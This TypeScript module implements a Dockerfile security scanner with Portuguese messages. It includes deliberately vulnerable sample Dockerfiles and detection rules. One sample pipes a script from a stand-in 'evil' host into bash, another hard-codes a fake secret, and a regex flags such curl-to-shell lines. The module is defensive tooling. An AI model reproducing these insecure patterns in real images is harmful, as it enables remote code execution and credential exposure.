import {
  ContainerAuditReport,
  DockerfileFinding,
  ContainerBaseImageAudit,
  ContainerSeverity
} from '../types/securityTools';

export const SAMPLE_DOCKERFILES: { name: string; description: string; content: string }[] = [
  {
    name: 'Node.js Express (Vulnerável - Padrão Comum)',
    description: 'Execução como root, imagem desatualizada sem hash, dependências de build expostas e sem healthcheck.',
    content: `FROM node:14
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
ENV PORT=3000
ENV SECRET_KEY=prod_super_secret_token_12345
EXPOSE 3000
CMD ["npm", "start"]`
  },
  {
    name: 'Python FastAPI (Riscos de Sudo e Cache)',
    description: 'Uso de apt-get sem limpeza de cache, curl inseguro via bash e socket do Docker montado.',
    content: `FROM python:3.8-slim
WORKDIR /server
RUN apt-get update && apt-get install -y sudo curl netcat
RUN curl -sSL https://raw.githubusercontent.com/evil/install.sh | bash
COPY . /server
RUN pip install -r requirements.txt
VOLUME /var/run/docker.sock
USER root
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]`
  },
  {
    name: 'Go Microservice (Multi-stage Hardened)',
    description: 'Multi-stage build usando distroless, usuário sem privilégios (non-root) e imagem limpa.',
    content: `FROM golang:1.22-alpine AS builder
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-w -s" -o /bin/app .

FROM gcr.io/distroless/static-debian12:nonroot
WORKDIR /
COPY --from=builder /bin/app /bin/app
USER 65532:65532
EXPOSE 8080
HEALTHCHECK --interval=30s --timeout=3s CMD ["/bin/app", "-health"]
ENTRYPOINT ["/bin/app"]`
  }
];

export function auditDockerfile(content: string, fileName: string = 'Dockerfile'): ContainerAuditReport {
  const lines = content.split('\n');
  const findings: DockerfileFinding[] = [];

  let hasUserDirective = false;
  let hasHealthcheck = false;
  let hasRootUserExplicit = false;
  let baseImage = 'unknown';
  let baseTag = 'latest';

  lines.forEach((rawLine, idx) => {
    const lineNum = idx + 1;
    const line = rawLine.trim();

    // Skip empty or comment lines
    if (!line || line.startsWith('#')) return;

    // Detect base image
    if (line.toUpperCase().startsWith('FROM ')) {
      const parts = line.split(/\s+/);
      if (parts[1]) {
        const imgParts = parts[1].split(':');
        baseImage = imgParts[0];
        baseTag = imgParts[1] || 'latest';
      }
    }

    // Check 1: USER directive
    if (line.toUpperCase().startsWith('USER ')) {
      hasUserDirective = true;
      if (line.toLowerCase().includes('root') || line.toLowerCase().includes('0')) {
        hasRootUserExplicit = true;
        findings.push({
          id: `cont-user-root-${lineNum}`,
          ruleCode: 'CIS-4.1 (DL3002)',
          title: 'Execução Explícita como Usuário Root',
          severity: 'CRITICAL',
          lineNumber: lineNum,
          lineContent: line,
          description: 'O contêiner declara execução como root. Se o contêiner for comprometido, o invasor obtém privilégios totais na máquina host.',
          remediation: 'Crie e utilize um usuário sem privilégios (ex: RUN adduser -D appuser && USER appuser).',
          cwe: 'CWE-250',
          mitreTechnique: 'T1611 (Escape to Host)',
          suggestedPatch: 'USER appuser'
        });
      }
    }

    // Check 2: HEALTHCHECK
    if (line.toUpperCase().startsWith('HEALTHCHECK ')) {
      hasHealthcheck = true;
      if (line.toUpperCase().includes('NONE')) {
        findings.push({
          id: `cont-healthcheck-none-${lineNum}`,
          ruleCode: 'CIS-4.6 (DL3061)',
          title: 'Healthcheck Desativado',
          severity: 'MEDIUM',
          lineNumber: lineNum,
          lineContent: line,
          description: 'A instrução HEALTHCHECK NONE remove o monitoramento do ciclo de vida da aplicação pelo orquestrador.',
          remediation: 'Configure um comando de verificação saudável como curl/wget periódico na porta do serviço.',
          cwe: 'CWE-754',
          suggestedPatch: 'HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost:3000/health || exit 1'
        });
      }
    }

    // Check 3: Secrets in ENV / ARG
    if (line.toUpperCase().startsWith('ENV ') || line.toUpperCase().startsWith('ARG ')) {
      if (/(secret|token|password|api_key|private_key|aws_access)/i.test(line)) {
        findings.push({
          id: `cont-secret-env-${lineNum}`,
          ruleCode: 'TRIVY-SEC-01',
          title: 'Segredo ou Credencial Declarada em Camada Docker (ENV/ARG)',
          severity: 'CRITICAL',
          lineNumber: lineNum,
          lineContent: line,
          description: 'Variáveis gravadas no Dockerfile persistem na imagem final e podem ser inspecionadas via "docker history".',
          remediation: 'Injete credenciais no runtime usando secrets do Kubernetes, Docker Secrets ou HashiCorp Vault.',
          cwe: 'CWE-798',
          mitreTechnique: 'T1552 (Unsecured Credentials)',
          suggestedPatch: '# Injetar no runtime via secret manager'
        });
      }
    }

    // Check 4: Docker socket mounting
    if (line.includes('/var/run/docker.sock')) {
      findings.push({
        id: `cont-dockersock-${lineNum}`,
        ruleCode: 'CIS-4.10',
        title: 'Exposição Perigosa do Socket do Docker Host',
        severity: 'CRITICAL',
        lineNumber: lineNum,
        lineContent: line,
        description: 'Montar o socket do Docker concede acesso root irrestrito ao daemon do host, permitindo escape total.',
        remediation: 'Remova o volume do socket docker. Se precisar de builds em CI, utilize ferramentas daemonless como Kaniko.',
        cwe: 'CWE-250',
        mitreTechnique: 'T1611',
        suggestedPatch: '# Remova a montagem do docker.sock'
      });
    }

    // Check 5: curl / wget pipe to bash
    if (/(curl|wget).+\|\s*(bash|sh)/i.test(line)) {
      findings.push({
        id: `cont-pipe-bash-${lineNum}`,
        ruleCode: 'DL4006',
        title: 'Execução de Script Remoto via Pipe (curl | sh)',
        severity: 'HIGH',
        lineNumber: lineNum,
        lineContent: line,
        description: 'Executar scripts baixados diretamente da internet sem validação de hash sha256 permite injeção arbitrária de backdoor.',
        remediation: 'Baixe o binário/script separadamente e valide sua assinatura criptográfica ou soma SHA256 antes da execução.',
        cwe: 'CWE-829',
        mitreTechnique: 'T1203',
        suggestedPatch: 'RUN curl -fsSL https://... -o script.sh && sha256sum -c hash.txt && sh script.sh'
      });
    }

    // Check 6: apt-get without cleaning cache
    if (line.includes('apt-get install') && !line.includes('/var/lib/apt/lists')) {
      findings.push({
        id: `cont-apt-cache-${lineNum}`,
        ruleCode: 'DL3009',
        title: 'Cache de Pacotes APT não Limpo (Inchaço da Imagem)',
        severity: 'LOW',
        lineNumber: lineNum,
        lineContent: line,
        description: 'Instalar pacotes sem limpar listas do apt aumenta desnecessariamente o tamanho da imagem e a superfície de ataque.',
        remediation: 'Adicione "&& rm -rf /var/lib/apt/lists/*" na mesma instrução RUN.',
        cwe: 'CWE-710',
        suggestedPatch: line + ' && rm -rf /var/lib/apt/lists/*'
      });
    }

    // Check 7: sudo installed
    if (/\b(sudo)\b/i.test(line) && line.toUpperCase().startsWith('RUN ')) {
      findings.push({
        id: `cont-sudo-${lineNum}`,
        ruleCode: 'DL3004',
        title: 'Utilitário "sudo" Instalado em Contêiner',
        severity: 'HIGH',
        lineNumber: lineNum,
        lineContent: line,
        description: 'Contêineres não devem possuir sudo instalado. Ele introduz vetores de escalada de privilégios.',
        remediation: 'Configure os privilégios na criação do usuário sem conceder acesso sudo.',
        cwe: 'CWE-250',
        suggestedPatch: '# Remova sudo dos pacotes instalados'
      });
    }

    // Check 8: ADD instead of COPY
    if (line.toUpperCase().startsWith('ADD ') && !line.includes('.tar') && !line.includes('.gz')) {
      findings.push({
        id: `cont-add-${lineNum}`,
        ruleCode: 'DL3020',
        title: 'Uso de ADD em vez de COPY para Arquivos Comuns',
        severity: 'LOW',
        lineNumber: lineNum,
        lineContent: line,
        description: 'A instrução ADD possui comportamento imprevisível com URLs remotas e descompressão automática.',
        remediation: 'Prefira sempre a instrução COPY para arquivos locais.',
        cwe: 'CWE-710',
        suggestedPatch: line.replace(/^ADD/i, 'COPY')
      });
    }
  });

  // Global Check: Missing USER directive
  if (!hasUserDirective && !hasRootUserExplicit) {
    findings.unshift({
      id: 'cont-user-missing',
      ruleCode: 'CIS-4.1',
      title: 'Ausência de Diretiva USER (Execução Padrão como Root)',
      severity: 'HIGH',
      lineNumber: lines.length,
      lineContent: 'EOF',
      description: 'Nenhum usuário foi especificado no Dockerfile. Por padrão, o Docker executa processos do contêiner como root.',
      remediation: 'Adicione um usuário sem privilégios (ex: USER 10001:10001 ou USER appuser).',
      cwe: 'CWE-250',
      mitreTechnique: 'T1611',
      suggestedPatch: 'USER 10001:10001'
    });
  }

  // Global Check: Missing HEALTHCHECK
  if (!hasHealthcheck) {
    findings.push({
      id: 'cont-healthcheck-missing',
      ruleCode: 'CIS-4.6',
      title: 'Ausência de Instrução HEALTHCHECK',
      severity: 'LOW',
      lineNumber: lines.length,
      lineContent: 'EOF',
      description: 'Sem HEALTHCHECK, orquestradores (K8s/Docker Swarm) não conseguem reiniciar automaticamente instâncias travadas.',
      remediation: 'Adicione HEALTHCHECK para validar se a porta HTTP está respondendo 200 OK.',
      cwe: 'CWE-754',
      suggestedPatch: 'HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:8080/health || exit 1'
    });
  }

  // Base image audit
  const isLatest = baseTag === 'latest' || baseTag === '';
  const isOldNode = baseImage === 'node' && (baseTag.startsWith('10') || baseTag.startsWith('12') || baseTag.startsWith('14') || baseTag.startsWith('16'));
  const isOldPython = baseImage === 'python' && (baseTag.startsWith('2') || baseTag.startsWith('3.6') || baseTag.startsWith('3.7') || baseTag.startsWith('3.8'));

  const baseImageAudit: ContainerBaseImageAudit = {
    baseImage,
    tag: baseTag,
    isOutdated: isLatest || isOldNode || isOldPython,
    latestSecureTag: baseImage === 'node' ? '20-alpine' : baseImage === 'python' ? '3.12-slim' : 'distroless/static-debian12:nonroot',
    isPinnedByHash: content.includes('@sha256:'),
    knownCveCount: isOldNode ? 38 : isOldPython ? 42 : isLatest ? 14 : 0,
    criticalCves: isOldNode 
      ? ['CVE-2023-30589 (OpenSSL Crash)', 'CVE-2022-35256 (HTTP Request Smuggling)', 'CVE-2021-22918 (Buffer Overflow)']
      : isOldPython 
      ? ['CVE-2023-24329 (URL Parsing Bypass)', 'CVE-2022-45061 (DoS in CPU float conversion)']
      : []
  };

  const summary = {
    critical: findings.filter(f => f.severity === 'CRITICAL').length,
    high: findings.filter(f => f.severity === 'HIGH').length,
    medium: findings.filter(f => f.severity === 'MEDIUM').length,
    low: findings.filter(f => f.severity === 'LOW').length,
  };

  // Calculate score
  let penalty = summary.critical * 30 + summary.high * 15 + summary.medium * 8 + summary.low * 3;
  if (!baseImageAudit.isPinnedByHash) penalty += 5;
  if (baseImageAudit.isOutdated) penalty += 15;

  const totalScore = Math.max(0, 100 - penalty);
  const status = summary.critical > 0 || totalScore < 50 ? 'CRITICAL_RISK' : totalScore < 80 ? 'NEEDS_REVIEW' : 'SECURE';

  return {
    imageOrDockerfileName: fileName,
    totalScore,
    status,
    baseImageAudit,
    findings,
    summary,
    hardenedDockerfileSnippet: generateHardenedDockerfile(baseImage, content)
  };
}

function generateHardenedDockerfile(baseImage: string, originalContent: string): string {
  if (baseImage.includes('node')) {
    return `# ==============================================================================
# SECSCAN HARDENED MULTI-STAGE DOCKERFILE (NODE.JS)
# CIS Docker Benchmark 4.1 & Non-Root Least Privilege
# ==============================================================================

# Estágio 1: Compilação e Dependências
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

# Estágio 2: Imagem Final de Produção Segura
FROM node:20-alpine
WORKDIR /app

# Criação explícita de usuário não-root (UID 10001)
RUN addgroup -g 10001 -S appgroup && \\
    adduser -u 10001 -S appuser -G appgroup

COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules
COPY --chown=appuser:appgroup . .

# Descarte de privilégios de root
USER 10001:10001
ENV NODE_ENV=production
EXPOSE 3000

# Verificação de saúde em runtime
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\
  CMD wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1

CMD ["node", "index.js"]`;
  }

  return `# ==============================================================================
# SECSCAN HARDENED DOCKERFILE
# ==============================================================================
FROM cgr.dev/chainguard/static:latest
WORKDIR /app
COPY --chown=65532:65532 . .
USER 65532:65532
HEALTHCHECK --interval=30s --timeout=3s CMD ["/app/healthcheck"]
ENTRYPOINT ["/app/main"]`;
}
